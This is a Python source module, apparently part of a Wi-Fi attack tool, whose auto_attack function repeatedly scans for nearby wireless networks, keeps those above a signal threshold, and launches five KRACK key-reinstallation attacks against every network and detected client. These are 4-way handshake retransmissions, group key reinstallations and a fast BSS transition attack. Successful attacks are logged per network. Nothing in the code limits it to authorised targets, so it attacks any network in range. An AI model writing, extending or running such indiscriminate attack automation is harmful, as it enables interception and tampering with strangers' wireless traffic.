from loguru import logger
import time
from .krack_core import parse_signal_strength
from .krack_network import scan_networks, detect_clients, sort_networks_by_strength
from .krack_attacks import (
    four_way_handshake_plaintext_retransmission,
    four_way_handshake_encrypted_retransmission,
    group_key_handshake_immediate_install,
    group_key_handshake_delayed_install,
    fast_bss_transition_attack
)

@logger.catch
def auto_attack(interface, min_signal=-70, attack_timeout=60, scan_interval=30, single_run=False):
    """
    Automatically scan for and attack networks based on signal strength.
    
    Args:
        interface (str): Network interface to use
        min_signal (int): Minimum signal strength to consider (in dBm)
        attack_timeout (int): Timeout for each attack attempt in seconds
        scan_interval (int): Time between network scans in seconds
        single_run (bool): If True, only run one scan cycle (for testing)
    
    Returns:
        dict: Dictionary of successful attacks by network
    """
    results = {}
    
    try:
        while True:
            try:
                # Scan for networks
                networks = scan_networks(interface)
                if not networks:
                    if single_run:
                        break
                    time.sleep(scan_interval)
                    continue
                
                # Sort networks by signal strength
                networks.sort(key=lambda x: parse_signal_strength(x['Signal']), reverse=True)
                
                # Try to attack each network above minimum signal strength
                for network in networks:
                    signal = parse_signal_strength(network['Signal'])
                    if signal >= min_signal:
                        try:
                            # Try to detect clients
                            clients = detect_clients(interface, network['Address'], timeout=attack_timeout)
                            
                            if clients:
                                # Attempt attacks with detected clients
                                for client in clients:
                                    # Track successful attacks for this network
                                    if network['Address'] not in results:
                                        results[network['Address']] = []
                                    
                                    # Attempt 4-way handshake attacks
                                    try:
                                        if four_way_handshake_plaintext_retransmission(interface, network['Address'], client):
                                            results[network['Address']].append('4way_plaintext')
                                    except TimeoutError:
                                        pass
                                        
                                    try:
                                        if four_way_handshake_encrypted_retransmission(interface, network['Address'], client):
                                            results[network['Address']].append('4way_encrypted')
                                    except TimeoutError:
                                        pass
                                    
                                    # Attempt group key attacks
                                    try:
                                        if group_key_handshake_immediate_install(interface, network['Address']):
                                            results[network['Address']].append('group_immediate')
                                    except TimeoutError:
                                        pass
                                        
                                    try:
                                        if group_key_handshake_delayed_install(interface, network['Address']):
                                            results[network['Address']].append('group_delayed')
                                    except TimeoutError:
                                        pass
                                    
                                    # Attempt fast BSS transition attack
                                    try:
                                        if fast_bss_transition_attack(interface, network['Address'], client):
                                            results[network['Address']].append('fast_bss')
                                    except TimeoutError:
                                        pass
                        except Exception as e:
                            logger.error(f"Error attacking network {network['ESSID']}: {str(e)}")
                            continue
                
                if single_run:
                    break
                    
                time.sleep(scan_interval)
                
            except Exception as e:
                logger.error(f"Error during scan cycle: {str(e)}")
                if not single_run:
                    time.sleep(scan_interval)
                    continue
                break
            
    except KeyboardInterrupt:
        pass
    except Exception as e:
        logger.error(f"Error during auto attack: {str(e)}")
    
    return results